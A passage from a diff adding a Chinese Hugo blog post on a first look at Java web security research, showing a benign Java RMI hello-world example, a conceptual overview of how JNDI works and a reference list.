+    <span class="kd">public</span> <span class="n">String</span> <span class="nf">sayHello</span><span class="o">()</span> <span class="kd">throws</span> <span class="n">RemoteException</span> <span class="o">{</span>
+        <span class="k">return</span> <span class="s">&#34;Hello from MyRemoteServiceImpl!&#34;</span><span class="o">;</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div><ol start="3">
+<li><strong>注册远程对象</strong>：现在，我们需要在 RMI 注册表中注册这个远程对象，以便客户端能够通过 JNDI 查找它。</li>
+</ol>
+<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"><span class="kn">import</span> <span class="nn">java.rmi.registry.LocateRegistry</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.rmi.registry.Registry</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">MyRemoteServer</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="n">MyRemoteService</span> <span class="n">service</span> <span class="o">=</span> <span class="k">new</span> <span class="n">MyRemoteServiceImpl</span><span class="o">();</span>
+            <span class="n">Registry</span> <span class="n">registry</span> <span class="o">=</span> <span class="n">LocateRegistry</span><span class="o">.</span><span class="na">createRegistry</span><span class="o">(</span><span class="n">1099</span><span class="o">);</span>
+            <span class="n">registry</span><span class="o">.</span><span class="na">bind</span><span class="o">(</span><span class="s">&#34;MyRemoteService&#34;</span><span class="o">,</span> <span class="n">service</span><span class="o">);</span>
+            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;MyRemoteService is ready.&#34;</span><span class="o">);</span>
+        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div><ol start="4">
+<li><strong>查找和使用远程对象</strong>：最后，客户端可以使用 JNDI 查找这个远程对象，并调用它的方法。</li>
+</ol>
+<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"><span class="kn">import</span> <span class="nn">java.rmi.registry.LocateRegistry</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.rmi.registry.Registry</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">MyRemoteClient</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="n">Registry</span> <span class="n">registry</span> <span class="o">=</span> <span class="n">LocateRegistry</span><span class="o">.</span><span class="na">getRegistry</span><span class="o">(</span><span class="s">&#34;localhost&#34;</span><span class="o">,</span> <span class="n">1099</span><span class="o">);</span>
+            <span class="n">MyRemoteService</span> <span class="n">service</span> <span class="o">=</span> <span class="o">(</span><span class="n">MyRemoteService</span><span class="o">)</span> <span class="n">registry</span><span class="o">.</span><span class="na">lookup</span><span class="o">(</span><span class="s">&#34;MyRemoteService&#34;</span><span class="o">);</span>
+            <span class="n">String</span> <span class="n">result</span> <span class="o">=</span> <span class="n">service</span><span class="o">.</span><span class="na">sayHello</span><span class="o">();</span>
+            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;Result from remote service: &#34;</span> <span class="o">+</span> <span class="n">result</span><span class="o">);</span>
+        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div><p>在这个示例中，我们首先创建了一个名为 <code>MyRemoteService</code> 的远程接口，然后创建了一个实现该接口的类 <code>MyRemoteServiceImpl</code>。接着，我们在 RMI 注册表中注册了这个远程对象。最后，客户端使用 JNDI 查找这个远程对象，并调用它的 <code>sayHello()</code> 方法。</p>
+<p>总之，JNDI（Java Naming and Directory Interface）是一个 Java API，为开发人员提供了一种统一的接口，用于在分布式系统中查找和访问远程对象、服务和资源。JNDI 的工作原理基于以下几个关键概念：</p>
+<ol>
+<li><strong>命名空间（Naming Space）</strong>：JNDI 使用树形结构的命名空间来存储和组织对象的引用。这些引用通常使用类似于文件系统路径的名称表示，例如 <code>java:comp/env/jdbc/MyDataSource</code>。</li>
+<li><strong>上下文（Context）</strong>：上下文是 JNDI 命名空间中的一个节点，它包含了一组名称到对象的映射。上下文可以包含其他上下文，形成一个层次结构。</li>
+<li><strong>服务提供者（Service Provider）</strong>：JNDI 不直接与底层命名和目录服务交互，而是通过服务提供者接口（SPI）与之通信。服务提供者负责实现 JNDI API 与特定命名和目录服务（如 LDAP、DNS、RMI ）之间的适配。</li>
+</ol>
+<p>下面是一个 JNDI 工作原理的示意图：</p>
+<pre><code> +---------------------+       +----------------------+
+ |    JNDI Client      |       |  JNDI Service        |
+ |                     |       |   Provider (SPI)     |
+ +---------------------+       +----------------------+
+ |  InitialContext     |&lt;-----&gt;|    LDAP Provider     |
+ |  Context            |       |    DNS Provider      |
+ |  NamingEnumeration  |       |    RMI Provider      |
+ +---------------------+       +----------------------+
+</code></pre><p>当客户端需要查找或访问远程对象时，它首先创建一个 <code>InitialContext</code> 对象，这个对象包含了与特定服务提供者的连接信息。然后，客户端可以使用 <code>lookup()</code>、<code>bind()</code> 等方法与命名空间进行交互。这些方法的调用会被传递给相应的服务提供者，服务提供者负责实现这些方法并与底层的命名和目录服务进行通信。</p>
+<p>通过这种分层架构，JNDI 为开发人员提供了一个统一的、灵活的和易于使用的接口，用于查找和访问分布式系统中的远程对象和资源。</p>
+<p>最后的最后，复读一下“文中所介绍的几个功能应该算是 Java 初学者最先接触的技术，虽然只是冰山一角，但通过对这些技术的学习可以让我们管窥 Java EE 的全貌，也为后续针对性的研究打好基础。 ”</p>
+<h2 id="reference">Reference</h2>
+<ol>
+<li><a href="https://evilpan.com/2023/04/01/java-ee/" target="_blank" rel="noopener noreffer ">Java 安全研究初探 - evilpan</a></li>
+<li><a href="https://www.oracle.com/java/technologies/java-ee-glance.html" target="_blank" rel="noopener noreffer ">Java EE - Oracle</a></li>
+<li><a href="https://en.wikipedia.org/wiki/Jakarta_EE" target="_blank" rel="noopener noreffer ">Jakarta EE - Wikipedia</a></li>
+<li><a href="https://javasec.org/" target="_blank" rel="noopener noreffer ">Java Web 安全 - javasec.org</a></li>
+<li><a href="https://jcp.org/en/jsr/ec?listBy=1" target="_blank" rel="noopener noreffer ">JSRs by Committee - SE/EE</a></li>
+<li><a href="https://github.com/jakartaee">https://github.com/jakartaee</a></li>
+<li><a href="https://en.wikipedia.org/wiki/Jakarta_Servlet" target="_blank" rel="noopener noreffer ">Jakarta_Servlet - Wikipedia</a></li>
+<li><a href="https://jcp.org/en/jsr/detail?id=340" target="_blank" rel="noopener noreffer ">JSR 340: Java Servlet 3.1 Specification</a></li>
+<li><a href="https://stackify.com/spring-mvc/" target="_blank" rel="noopener noreffer ">How Spring Web MVC Really Works</a></li>
+<li><a href="https://en.wikipedia.org/wiki/Jakarta_Server_Pages" target="_blank" rel="noopener noreffer ">Jakarta_Server_Pages - Wiki</a></li>
+<li><a href="https://www.tutorialspoint.com/jsp/index.htm" target="_blank" rel="noopener noreffer ">JSP Tutorial</a></li>
+<li><a href="https://jcp.org/en/jsr/detail?id=245" target="_blank" rel="noopener noreffer ">JSR 245: JavaServerTM Pages 2.1</a></li>
+<li><a href="https://evilpan.com/2021/12/13/jndi-injection/#jndi-101" target="_blank" rel="noopener noreffer ">JNDI 注入漏洞的前世今生 - evilpan</a></li>
+</ol></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2023-04-03</span>
+            </div><div class="post-info-license">
+                <span>[CC 4.0 BY-SA](https://creativecommons.org/licenses/by-nc/4.0/)</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="http://example.org/posts/a_first_look_at_java_web_security_research/" data-title="Java 安全研究初探" data-via="@solaris_linus" data-hashtags="Java Web,Security"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="http://example.org/posts/a_first_look_at_java_web_security_research/" data-title="Java 安全研究初探"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="http://example.org/posts/a_first_look_at_java_web_security_research/" data-title="Java 安全研究初探"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@7.3.0/icons/line.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="http://example.org/posts/a_first_look_at_java_web_security_research/" data-title="Java 安全研究初探"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/java-web/">Java Web</a>,&nbsp;<a href="/tags/security/">Security</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/ai_&#43;_productivity_tool_collections/" class="prev" rel="prev" title="AI &#43; Productivity Tool Collections"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>AI + Productivity Tool Collections</a></div>
+</div>
+<div id="comments"></div></article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.68.3">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Solar1s</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/css/lightgallery-bundle.min.css"><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/lightgallery.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/thumbnail/lg-thumbnail.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/zoom/lg-zoom.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"lightgallery":true};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
